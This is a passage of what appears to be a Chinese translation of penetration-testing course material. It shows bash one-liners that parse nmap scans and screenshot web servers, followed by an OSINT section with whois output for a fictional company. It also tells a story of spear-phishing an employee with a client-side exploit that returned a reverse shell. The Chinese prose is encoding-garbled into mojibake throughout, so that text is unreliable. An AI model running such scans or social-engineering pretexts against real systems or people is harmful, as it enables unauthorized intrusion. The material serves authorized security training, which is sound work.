256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Status: Up\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\næœ‰è¶£çš„æ˜¯ï¼Œæ¯ä¸ª IP åœ°å€é‡å¤äº†ä¸¤æ¬¡ï¼Œç¬¬ä¸€è¡Œæ˜¾ç¤ºæœºå™¨çŠ¶æ€ï¼Œç¬¬äºŒè¡Œæ˜¾ç¤ºè¢«æ‰«æçš„ç«¯å£å·ã€‚ç”±äºæˆ‘ä»¬åªå¯¹å”¯ä¸€çš„ IP åœ°å€æ„Ÿå…´è¶£ï¼Œæ‰€ä»¥æœ‰å¿…è¦è¿›è¡Œä¸€äº›æ¸…ç†ã€‚è®©æˆ‘ä»¬å¤šåŒ…å«ç«¯å£ 80 çš„è¡Œè¿›è¡Œ grepã€‚\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80\n# Nmap 7.60 scan initiated Sun Mar 18 18:57:48 2019 as: nmap -A -p80 --open -oG nmapscan_10.11.1.1-254 10.11.1.0/24\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\nè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¼€å§‹ï¼Œä½†æ³¨æ„åˆ°ç¬¬ä¸€è¡Œæ˜¯ä¸ç›¸å…³çš„ã€‚ä¸ºäº†æ’é™¤å®ƒï¼Œæˆ‘ä»¬å°†ç”¨ `-v` å†æ¬¡ grepï¼Œè¿™æ˜¯ä¸€ä¸ª â€œåå‘ grepâ€ï¼Œåªæ˜¾ç¤ºä¸åŒ¹é…æœç´¢å­—ç¬¦ä¸²çš„è¡Œã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¸æƒ³è¦ä»»ä½•åŒ…å«å¤§å°å†™å…³é”®è¯ â€œNmapâ€ çš„è¡Œã€‚\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\"\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\næˆ‘ä»¬çš„è¾“å‡ºçœ‹èµ·æ¥å¥½å¤šäº†ã€‚è®©æˆ‘ä»¬è¯•ç€åªæå– IP åœ°å€ï¼Œå› ä¸ºè¿™å°±æ˜¯æˆ‘ä»¬çœŸæ­£æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ awk æ¥æ‰“å°ç¬¬äºŒä¸ªå­—æ®µï¼Œç”¨ `Space` ä½œä¸ºåˆ†éš”ç¬¦ã€‚\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\" | awk '{print\n$2}'\n10.11.1.8\n10.11.1.10\n10.11.1.13\n10.11.1.14\n10.11.1.22\n10.11.1.24\n10.11.1.31\n10.11.1.39\n10.11.1.49\n10.11.1.50\n10.11.1.71\n...\n```\n\nå¾ˆå¥½ã€‚è¿™çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå¹²å‡€çš„ IP åœ°å€åˆ—è¡¨ã€‚ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Bash å•è¡Œç¨‹åºæ¥å¾ªç¯æµè§ˆä¸Šé¢çš„ IP åˆ—è¡¨ï¼Œå¹¶è¿è¡Œ `cutycapt`ï¼Œè¿™æ˜¯ä¸€ä¸ª Qt WebKit ç½‘é¡µæ¸²æŸ“æ•æ‰å·¥å…·ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ `-url` æ¥æŒ‡å®šç›®æ ‡ç½‘ç«™ï¼Œä½¿ç”¨ `-out` æ¥æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ã€‚\n\n```bash\nkali@kali:~/temp$ for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done\n```\n\nä¸€æ—¦æˆ‘ä»¬çš„å¾ªç¯ç»“æŸå¹¶æœ‰äº†æç¤ºï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ ls çš„ `-l` é€‰é¡¹æ£€æŸ¥ç”±æˆ‘ä»¬çš„ Bash å•è¡Œç¨‹åºåˆ›å»ºçš„è¾“å‡ºæ–‡ä»¶çš„åˆ—è¡¨ï¼Œå®ƒæ¯è¡Œåˆ—å‡ºä¸€ä¸ªæ–‡ä»¶ï¼ŒæŠ‘åˆ¶äº†å…¶ä»–ç»†èŠ‚ã€‚\n\n```bash\nkali@kali:~/temp$ ls -1 *.png\n10.11.1.10.png\n10.11.1.115.png\n10.11.1.116.png\n10.11.1.128.png\n10.11.1.13.png\n10.11.1.133.png\n10.11.1.14.png\n10.11.1.202.png\n10.11.1.209.png\n10.11.1.217.png\n...\n```\n\nå®Œç¾ã€‚æˆ‘ä»¬æ­£è¶Šæ¥è¶Šæ¥è¿‘æˆ‘ä»¬çš„ç›®æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥å•ç‹¬æ£€æŸ¥è¿™äº›æ–‡ä»¶ï¼Œä½†æ›´æœ‰å¸å¼•åŠ›çš„é€‰æ‹©æ˜¯å†æ¬¡å°†æˆ‘ä»¬çš„è„šæœ¬åªæ˜¯ç”¨äºå·¥ä½œï¼Œçœ‹çœ‹æ˜¯å¦è¿˜æœ‰å…¶ä»–å¯ä»¥è‡ªåŠ¨åŒ–çš„ä¸œè¥¿ã€‚è¿™ä¸ä»…éœ€è¦ Bash è„šæœ¬æŠ€èƒ½ï¼Œè¿˜éœ€è¦åŸºæœ¬çš„ HTML çŸ¥è¯†ã€‚\n\n```bash\nkali@kali:~/temp$ cat ./pngtohtml.sh\n#!/bin/bash\n# Bash script to examine the scan results through HTML.\n\necho \"<HTML><BODY><BR>\" > web.html\n\nls -1 *.png | awk -F : '{ print $1\":\\\\n<BR><IMG SRC=\\\\\"\"$1\"\"$2\"\\\\\" width=600><BR>\"}' >>\nweb.html\n\necho \"</BODY></HTML>\" >> web.html\n\nkali@kali:~/temp$ chmod +x ./pngtohtml.sh\n\nkali@kali:~/temp$ ./pngtohtml.sh\n\nkali@kali:~/temp$ firefox web.html\n```\n\nè¿™è„šæœ¬å»ºç«‹äº†ä¸€ä¸ª HTML æ–‡ä»¶ï¼ˆweb.htmlï¼‰ï¼Œä»æœ€åŸºæœ¬çš„æ ‡ç­¾å¼€å§‹ã€‚ç„¶åï¼Œls å’Œ awk è¯­å¥å°†æ¯ä¸ª  `.PNG` æ–‡ä»¶åæ’å…¥ä¸€ä¸ª HTML IMG æ ‡ç­¾ï¼Œå°†å…¶è¿½åŠ åˆ°æˆ‘ä»¬çš„ web.html æ–‡ä»¶ã€‚æœ€åï¼Œæˆ‘ä»¬å°† HTML ç»“æŸæ ‡ç­¾é™„åŠ åˆ°æ–‡æœ¬ä¸­ï¼Œä½¿è„šæœ¬å¯æ‰§è¡Œï¼Œå¹¶åœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹ã€‚ç»“æœå¾ˆç®€å•ï¼Œä½†å¾ˆæœ‰æ•ˆï¼Œè®©æˆ‘ä»¬çœ‹åˆ°äº†æ¯ä¸ªç½‘ç»œæœåŠ¡å™¨çš„ä¸»é¡µé¢ã€‚\n\nå¸Œæœ›è¿™äº›ç®€çŸ­çš„å®é™…ä¾‹å­èƒ½è®©ä½ äº†è§£åˆ° Bash è„šæœ¬æ‰€èƒ½æä¾›çš„ä¸€äº›å¯èƒ½æ€§ã€‚å½“è¯•å›¾åœ¨è¯„ä¼°è¿‡ç¨‹ä¸­å¿«é€Ÿå®ç°å¤§é‡ä»»åŠ¡çš„è‡ªåŠ¨åŒ–æ—¶ï¼Œå­¦ä¼šæœ‰æ•ˆä½¿ç”¨ Bash å°†æ˜¯è‡³å…³é‡è¦çš„ã€‚\n\n### ç»ƒä¹ \n\n1. ç ”ç©¶ Bash å¾ªç¯å¹¶ç¼–å†™ä¸€ä¸ªç®€çŸ­çš„è„šæœ¬ï¼Œå¯¹ä½ çš„ç›®æ ‡ IP èŒƒå›´ 10.11.1.0/24 è¿›è¡Œ ping æ‰«é¢‘ã€‚\n2. å°è¯•ç”¨æ›´é«˜çº§çš„è„šæœ¬è¯­è¨€ï¼Œå¦‚ Pythonã€Prel æˆ– Rubyï¼Œæ¥å®Œæˆä¸Šè¿°ç»ƒä¹ ã€‚\n3. ä½¿ç”¨æœ¬æ¨¡å—ä¸­çš„å®é™…ä¾‹å­æ¥å¸®åŠ©ä½ åˆ›å»ºä¸€ä¸ª Bash è„šæœ¬ï¼Œä» access_log.txt æ–‡ä»¶ä¸­æå– JavaScript æ–‡ä»¶ï¼ˆhttp://www.offensive-security.com/pwkfiles/access_log.txt.gzï¼‰ã€‚ç¡®ä¿æ–‡ä»¶åä¸åŒ…æ‹¬è·¯å¾„ï¼Œå¹¶ä¸”æ˜¯æ’åºçš„ã€‚\n4. ç”¨å¦ä¸€ç§è¯­è¨€ï¼Œå¦‚Pythonã€Prel æˆ– Rubyï¼Œé‡æ–°ç¼–å†™å‰é¢çš„ç»ƒä¹ ã€‚\n\n# è¢«åŠ¨çš„ä¿¡æ¯æ”¶é›†\n\nè¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼ˆä¹Ÿç§°å¼€æºæƒ…æŠ¥æˆ– OSINTï¼‰æ˜¯æ”¶é›†æœ‰å…³ç›®æ ‡çš„å…¬å¼€ä¿¡æ¯çš„è¿‡ç¨‹é€šå¸¸ä¸ä¸è¯¥ç›®æ ‡æœ‰ä»»ä½•ç›´æ¥äº’åŠ¨ã€‚\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨å„ç§èµ„æºå’Œå·¥å…·æ¥æ”¶é›†è¿™äº›ä¿¡æ¯ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯å¾ªç¯çš„è€Œä¸æ˜¯çº¿æ€§çš„ã€‚æ¢å¥è¯è¯´ï¼Œè¿™ä¸ªè¿‡ç¨‹çš„ä»»ä½•é˜¶æ®µçš„â€œä¸‹ä¸€æ­¥â€éƒ½å–å†³äºæˆ‘ä»¬åœ¨ä»¥å‰çš„æ­¥éª¤ä¸­æ‰€å‘ç°çš„ä¸œè¥¿ï¼Œä»è€Œå½¢æˆè¿‡ç¨‹çš„â€œå¾ªç¯â€ã€‚ç”±äºæ¯ä¸ªå·¥å…·æˆ–èµ„æºå¯ä»¥äº§ç”Ÿä»»ä½•æ•°é‡çš„ä¸åŒç»“æœï¼Œå› æ­¤å¾ˆéš¾å®šä¹‰ä¸€ä¸ªæ ‡å‡†åŒ–çš„è¿‡ç¨‹ã€‚è¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„æœ€ç»ˆç›®æ ‡æ˜¯è·å¾—æ¾„æ¸…æˆ–æ‰©å¤§æ”»å‡»é¢çš„ä¿¡æ¯ï¼Œå¸®åŠ©æˆ‘ä»¬æˆåŠŸçš„ç½‘ç»œé’“é±¼æ´»åŠ¨ï¼Œæˆ–è¡¥å……å…¶ä»–æ¸—é€æµ‹è¯•æ­¥éª¤ï¼Œå¦‚å¯†ç çŒœæµ‹ã€‚\n\nç”±äºè¿™ä¸€è¿‡ç¨‹çš„å¾ªç¯æ€§è´¨ï¼Œæœ¬æ¨¡å—çš„å±•å¼€æ–¹å¼å°†ä¸ä¹‹å‰çš„æ¨¡å—ä¸åŒã€‚æˆ‘ä»¬å°†ç®€å•åœ°ä»‹ç»å„ç§èµ„æºå’Œå·¥å…·ï¼Œè§£é‡Šå®ƒä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œå¹¶ç”¨å»ºç«‹ä¸€ä¸ªè¢«åŠ¨çš„ä¿¡æ¯æ”¶é›†æ´»åŠ¨æ‰€éœ€çš„åŸºæœ¬æŠ€æœ¯æ¥æ­¦è£…ä½ ï¼Œè€Œä¸æ˜¯æå‡ºæœ‰è”ç³»çš„åœºæ™¯ã€‚\n\nåœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰è¢«åŠ¨ä¿¡æ¯æ”¶é›†ã€‚å…³äºåœ¨è¿™ç§æƒ…å†µä¸‹ä»€ä¹ˆæ˜¯â€œè¢«åŠ¨â€ï¼Œæœ‰ä¸¤ä¸ªä¸åŒçš„æµæ´¾ã€‚\n\nåœ¨æœ€ä¸¥æ ¼çš„è§£é‡Šä¸­ï¼Œæˆ‘ä»¬ä»ä¸ä¸ç›®æ ‡ç›´æ¥æ²Ÿé€šã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä¾é ç¬¬ä¸‰æ–¹è·å–ä¿¡æ¯ï¼Œä½†æˆ‘ä»¬ä¸ä¼šè®¿é—®ç›®æ ‡çš„ä»»ä½•ç³»ç»Ÿæˆ–æœåŠ¡å™¨ã€‚\n\nä½¿ç”¨è¿™ç§æ–¹å¼å¯ä»¥å¯¹æˆ‘ä»¬çš„è¡ŒåŠ¨å’Œæ„å›¾ä¿æŒé«˜åº¦çš„ä¿å¯†æ€§ï¼Œä½†ä¹Ÿå¯èƒ½æ˜¯éº»çƒ¦çš„ï¼Œå¹¶å¯èƒ½é™åˆ¶æˆ‘ä»¬çš„ç»“æœã€‚\n\nåœ¨ä¸€ä¸ªè¾ƒå®½æ¾çš„è§£é‡Šä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¸ç›®æ ‡è¿›è¡Œäº’åŠ¨ï¼Œä½†åªæ˜¯åƒä¸€ä¸ªæ­£å¸¸çš„äº’è”ç½‘ç”¨æˆ·é‚£æ ·ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™å…è®¸æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘ä»¬ä¸ä¼šæµ‹è¯•ç½‘ç«™çš„æ¼æ´ã€‚\n\nåœ¨æœ¬æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å°†å¯¹æˆ‘ä»¬çš„æ–¹æ³•é‡‡ç”¨åä¸€ç§ä¸å¤ªä¸¥æ ¼çš„è§£é‡Šã€‚è¿™ä¸¤ç§æ–¹æ³•éƒ½ä¸ä¸€å®šâ€œæ­£ç¡®â€ã€‚åœ¨å†³å®šä½¿ç”¨å“ªç§æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘æ¸—é€æµ‹è¯•çš„èŒƒå›´ä¸å‚ä¸è§„åˆ™ã€‚æ­¤å¤–ï¼Œè¯·è®°ä½è¿™ä¸ªé˜¶æ®µå¯èƒ½å¹¶ä¸æ€»æ˜¯å¿…è¦çš„ï¼Œå³ä½¿è¿™ä¸ªé˜¶æ®µå–å¾—äº†æˆæœï¼ˆä¾‹å¦‚ä»¥æˆåŠŸçš„é±¼å‰ç½‘ç»œé’“é±¼æ´»åŠ¨çš„å½¢åŠ¿ï¼‰ï¼Œå…¶ä»–é˜¶æ®µå¯èƒ½éœ€è¦åŒç­‰æˆ–æ›´å¤§çš„å…³æ³¨ã€‚\n\nåœ¨æˆ‘ä»¬å¼€å§‹è®¨è®ºèµ„æºå’Œå·¥å…·ä¹‹å‰ï¼Œè®©æˆ‘ä»¬åˆ†äº«ä¸€ä¸ªæ¸—é€æµ‹è¯•çš„ä¸ªäººä¾‹å­ï¼Œå…¶ä¸­æ¶‰åŠè¢«åŠ¨ä¿¡æ¯æ”¶é›†æ´»åŠ¨çš„æˆåŠŸè¦ç´ ã€‚\n\n**ä½œè€…çš„è¯´æ˜**\n\nå‡ å¹´å‰ï¼Œæˆ‘ä»¬ Offensive Security å…¬å¸çš„ä»»åŠ¡æ˜¯ä¸ºä¸€å®¶å°å…¬å¸è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚è¿™å®¶å…¬å¸å‡ ä¹æ²¡æœ‰äº’è”ç½‘çš„å­˜åœ¨ï¼Œåªæœ‰å¾ˆå°‘çš„å¤–éƒ¨æš´éœ²æœåŠ¡ï¼Œæ‰€æœ‰è¿™äº›éƒ½è¢«è¯æ˜æ˜¯å®‰å…¨çš„ã€‚å®é™…ä¸Šï¼Œæ²¡æœ‰ä»»ä½•æ”»å‡»é¢å¯è¨€ã€‚ç»è¿‡é›†ä¸­çš„è¢«åŠ¨ä¿¡æ¯æ”¶é›†æ´»åŠ¨ï¼Œåˆ©ç”¨å„ç§è°·æ­Œæœç´¢è¿è¥å•†ï¼Œè¿æ¥åˆ°å…¶ä»–åœ¨çº¿å·¥å…·çš„ä¿¡æ¯â€œç®¡é“â€ï¼Œä»¥åŠä¸€ç‚¹åˆ›é€ æ€§çš„é€»è¾‘æ€ç»´ï¼Œæˆ‘ä»¬å‘ç°ç›®æ ‡å…¬å¸çš„ä¸€åå‘˜å·¥åœ¨ä¸€ä¸ªé›†é‚®è®ºå›ä¸Šå‘äº†ä¸€ä¸ªå¸–å­ã€‚\n\n```bash\nHi!\nI'm looking for rare stamps form the 1950's - for sale or trade.\nPlease contact me at david@company-address.com\nCell: 999-999-9999\n\nä½ å¥½ï¼\næˆ‘æ­£åœ¨å¯»æ‰¾ 20 ä¸–çºª 50 å¹´ä»£çš„ç¨€æœ‰é‚®ç¥¨ â€”â€” ç”¨äºå‡ºå”®æˆ–äº¤æ˜“ã€‚\nè¯·ä¸æˆ‘è”ç³» david@company-address.com\næ‰‹æœºï¼š999-999-9999\n```\n\næˆ‘ä»¬åˆ©ç”¨è¿™äº›ä¿¡æ¯å‘èµ·äº†ä¸€ä¸ªåŠå¤æ‚çš„å®¢æˆ·ç«¯æ”»å‡»ã€‚æˆ‘ä»¬è¿…é€Ÿæ³¨å†Œäº†ä¸€ä¸ªä¸é‚®ç¥¨æœ‰å…³çš„åŸŸåï¼Œå¹¶è®¾è®¡äº†ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæ˜¾ç¤ºæˆ‘ä»¬ç”¨è°·æ­Œå›¾ç‰‡æ‰¾åˆ°çš„ 50 å¹´ä»£çš„å„ç§ç¨€æœ‰é‚®ç¥¨ã€‚è¿™ä¸ªåŸŸåå’Œç½‘ç«™çš„è®¾è®¡æ— ç–‘å¢åŠ äº†æˆ‘ä»¬çš„é‚®ç¥¨äº¤æ˜“ç½‘ç«™çš„å¯æ„ŸçŸ¥çš„å¯é æ€§ã€‚\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ç½‘ç«™çš„ç½‘é¡µä¸ŠåµŒå…¥äº†ä¸€äº›è®¨åŒçš„å®¢æˆ·ç«¯æ”»å‡»åˆ©ç”¨ä»£ç ï¼Œå¹¶åœ¨å·¥ä½œæ—¥ç»™ â€œå¤§å«â€ æ‰“ç”µè¯ã€‚åœ¨ç”µè¯ä¸­ï¼Œæˆ‘ä»¬å‡æ‰®æˆä¸€ä¸ªç»§æ‰¿äº†ä»–ä»¬ç¥–çˆ¶çš„å·¨å¤§é‚®ç¥¨æ”¶è—çš„é›†é‚®è€…ã€‚\n\nå¤§å«æ¥åˆ°æˆ‘ä»¬çš„ç”µè¯åå–œå‡ºæœ›å¤–ï¼Œæ¯«ä¸çŠ¹è±«åœ°è®¿é—®äº†è¿™ä¸ªæ¶æ„ç½‘ç«™ï¼ŒæŸ¥çœ‹â€œé‚®ç¥¨æ”¶è—â€ã€‚åœ¨æµè§ˆè¯¥ç½‘ç«™æ—¶ï¼Œæ¼æ´ä»£ç åœ¨ä»–çš„æœ¬åœ°æœºå™¨ä¸Šæ‰§è¡Œï¼Œå¹¶å‘æˆ‘ä»¬å‘é€äº†ä¸€ä¸ªåå‘ Shellã€‚\n\nè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œè¯´æ˜ä¸€äº›æ— å®³çš„è¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„ä¿¡æ¯ï¼Œå¦‚ä¸€ä¸ªå‘˜å·¥ç”¨ä»–çš„å…¬å¸é‚®ç®±ä»äº‹ä¸ªäººä¸šåŠ¡ï¼Œå¯ä»¥åœ¨æ¸—é€æµ‹è¯•ä¸­å¯¼è‡´ä¸€ä¸ªç«‹è¶³ç‚¹ã€‚æœ‰æ—¶ï¼Œæœ€å°çš„ç»†èŠ‚å¯èƒ½æ˜¯æœ€é‡è¦çš„ã€‚\n\n<aside> ğŸ’¡ è™½ç„¶â€œå¤§å«â€æ²¡æœ‰éµå¾ªæœ€ä½³å®è·µï¼Œä½†æ­£æ˜¯è¯¥å…¬å¸çš„æ”¿ç­–å’Œç¼ºä¹å®‰å…¨æ„è¯†è®¡åˆ’ä¸ºè¿™ä¸€æ¼æ´åˆ›é€ äº†æ¡ä»¶ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œæˆ‘ä»¬é¿å…åœ¨ä¹¦é¢æŠ¥å‘Šä¸­æŠŠè´£ä»»æ¨ç»™æŸä¸ªäººã€‚ä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æé«˜å®¢æˆ·èµ„æºçš„å®‰å…¨æ€§ï¼Œè€Œä¸æ˜¯é’ˆå¯¹æŸä¸€ä¸ªå‘˜å·¥ã€‚ç®€å•åœ°åˆ é™¤â€œå¤§å«â€ä¸ä¼šè§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\n</aside>\n\nè®©æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€äº›æœ€æµè¡Œçš„å·¥å…·å’ŒæŠ€æœ¯ï¼Œå®ƒä»¬å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¿›è¡ŒæˆåŠŸçš„ä¿¡æ¯æ”¶é›†æ´»åŠ¨ã€‚æˆ‘ä»¬å°†ä½¿ç”¨MegaCorp Oneï¼Œä¸€ä¸ªç”± Offensive Security åˆ›å»ºçš„è™šæ„å…¬å¸ï¼Œä½œä¸ºæˆ‘ä»¬æ´»åŠ¨çš„ä¸»é¢˜ã€‚\n\n## è®°ç¬”è®°\n\nä¸€ä¸ªä¿¡æ¯æ”¶é›†æ´»åŠ¨å¯ä»¥äº§ç”Ÿå¤§é‡çš„æ•°æ®ï¼Œæˆ‘ä»¬å¿…é¡»å¾ˆå¥½åœ°ç®¡ç†è¿™äº›æ•°æ®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿›æ­¥çš„æœç´¢ä¸­åˆ©ç”¨è¿™äº›æ•°æ®ï¼Œæˆ–è€…åœ¨ä»¥åçš„é˜¶æ®µä½¿ç”¨è¿™äº›æ•°æ®ã€‚åšç¬”è®°çš„æ–¹æ³•æ²¡æœ‰å¯¹é”™ä¹‹åˆ†ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘ç°ï¼Œå¦‚æœæˆ‘ä»¬ä¿æŒè¯¦ç»†çš„ã€æ ¼å¼è‰¯å¥½çš„ç¬”è®°ï¼Œä»¥åæ£€ç´¢ä¿¡æ¯ä¼šæ›´å®¹æ˜“ã€‚\n\n## ç½‘ç«™ä¾¦æŸ¥\n\nå¦‚æœå®¢æˆ·æœ‰ä¸€ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„æµè§ˆç½‘ç«™æ¥æ”¶é›†åŸºæœ¬ä¿¡æ¯ã€‚å°å‹ç»„ç»‡å¯èƒ½åªæœ‰ä¸€ä¸ªç½‘ç«™ï¼Œè€Œå¤§å‹ç»„ç»‡å¯èƒ½æœ‰å¾ˆå¤šï¼ŒåŒ…æ‹¬ä¸€äº›æ²¡æœ‰ç»´æŠ¤çš„ç½‘ç«™ã€‚è®©æˆ‘ä»¬çœ‹çœ‹ MegaCorp One çš„ç½‘ç«™ï¼ˆhttps://www.megacorpone.com/ï¼‰ï¼Œä»¥äº†è§£æ›´å¤šå…³äºæˆ‘ä»¬çš„ç›®æ ‡ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/83621e12-5d8e-40d4-9f1f-8e0519044d1e/Untitled.png)\n\nå¯¹å…¶ç½‘ç«™çš„å¿«é€Ÿå®¡æŸ¥æ˜¾ç¤ºï¼Œä»–ä»¬æ˜¯ä¸€å®¶çº³ç±³æŠ€æœ¯å…¬å¸ã€‚\n\nåœ¨ https://www.megacorpone.com/about.htmlï¼Œå…³äºé¡µé¢æ˜¾ç¤ºäº†ä»–ä»¬ä¸€äº›å‘˜å·¥çš„ç”µå­é‚®ä»¶åœ°å€å’Œ Twitter è´¦æˆ·ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/979b7304-c407-4e77-b20b-3168c39e311b/Untitled.png)\n\næˆ‘ä»¬å¯ä»¥åœ¨ç¤¾ä¼šåª’ä½“çš„ä¿¡æ¯æ”¶é›†æ´»åŠ¨ä¸­ä½¿ç”¨è¿™äº›åœ°å€ã€‚æˆ‘ä»¬å°†åœ¨åé¢çš„ç« èŠ‚ä¸­è¯¦ç»†è®¨è®ºè¿™ä¸ªé—®é¢˜ã€‚\n\nè¿˜å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¯¥å…¬å¸çš„ç”µå­é‚®ä»¶åœ°å€æ ¼å¼éµå¾ªâ€œé¦–å­—æ¯+å§“æ°â€çš„æ¨¡å¼ã€‚ç„¶è€Œï¼Œä»–ä»¬çš„ CEO çš„ç”µå­é‚®ä»¶ä»…ä»…ä½¿ç”¨äº†ä»–çš„åå­—ã€‚è¿™è¡¨æ˜åˆ›å§‹äººæˆ–é•¿æœŸå‘˜å·¥çš„ç”µå­é‚®ä»¶æ ¼å¼ä¸æ–°å‘˜å·¥çš„ä¸åŒã€‚è¿™ä¸€ä¿¡æ¯åœ¨ä»¥åçš„è¯„ä¼°é˜¶æ®µå¯èƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚\n\nåœ¨åŒä¸€é¡µä¸Šå‘ç°çš„ä¼ä¸šç¤¾äº¤åª’ä½“è´¦æˆ·ï¼Œä¹Ÿå€¼å¾—è®°å½•ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥ç ”ç©¶ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1dce2389-4def-497c-91fd-870252c1ee6b/Untitled.png)\n\nè®©æˆ‘ä»¬æ›´æ–°æˆ‘ä»¬çš„ç¬”è®°ï¼Œä»¥è®°å½•è¿™äº›ä¿¡æ¯çš„æ¯ä¸€ç‚¹ï¼ŒåŒ…æ‹¬ç”µå­é‚®ä»¶åœ°å€æ ¼å¼å’Œç¤¾äº¤åª’ä½“ç½‘ç«™çš„å‚è€ƒã€‚\n\n## Whois æšä¸¾\n\nWhois æ˜¯ä¸€ç§ TCP æœåŠ¡ã€å·¥å…·å’Œä¸€ç§æ•°æ®åº“ï¼Œå¯ä»¥æä¾›å…³äºåŸŸåçš„ä¿¡æ¯ï¼Œå¦‚åç§°æœåŠ¡å™¨å’Œæ³¨å†Œå•†ã€‚è¿™äº›ä¿¡æ¯é€šå¸¸æ˜¯å…¬å¼€çš„ï¼Œå› ä¸ºæ³¨å†Œå•†å¯¹ç§äººæ³¨å†Œæ”¶å–è´¹ç”¨ã€‚\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡å°†åŸŸå [megacorpone.com](http://megacorpone.com/) ä¼ å…¥ whois å®¢æˆ·ç«¯ï¼Œæ‰§è¡Œæ ‡å‡†çš„å‰å‘æœç´¢ï¼Œæ¥æ”¶é›†åŸŸåçš„åŸºæœ¬ä¿¡æ¯ã€‚\n\n```bash\nkali@kali:~$ whois megacorpone.com\n Domain Name: MEGACORPONE.COM\n Registry Domain ID: 1775445745_DOMAIN_COM-VRSN\n Registrar WHOIS Server: whois.gandi.net\n Registrar URL: <http://www.gandi.net>\n Updated Date: 2019-01-01T09:45:03Z\n Creation Date: 2013-01-22T23:01:00Z\n Registry Expiry Date: 2023-01-22T23:01:00Z\n...\nRegistry Registrant ID:\nRegistrant Name: Alan Grofield\nRegistrant Organization: MegaCorpOne\nRegistrant Street: 2 Old Mill St\nRegistrant City: Rachel\nRegistrant State/Province: Nevada\nRegistrant Postal Code: 89001\nRegistrant Country: US\nRegistrant Phone: +1.9038836342\n...\nRegistry Admin ID:\nAdmin Name: Alan Grofield\nAdmin Organization: MegaCorpOne\nAdmin Street: 2 Old Mill St\nAdmin City: Rachel\nAdmin State/Province: Nevada\nAdmin Postal Code: 89001\nAdmin Country: US\nAdmin Phone: +1.9038836342\n...\nRegistry Tech ID:\nTech Name: Alan Grofield\nTech Organization: MegaCorpOne\nTech Street: 2 Old Mill St\nTech City: Rachel\nTech State/Province: Nevada\nTech Postal Code: 89001\nTech Country: 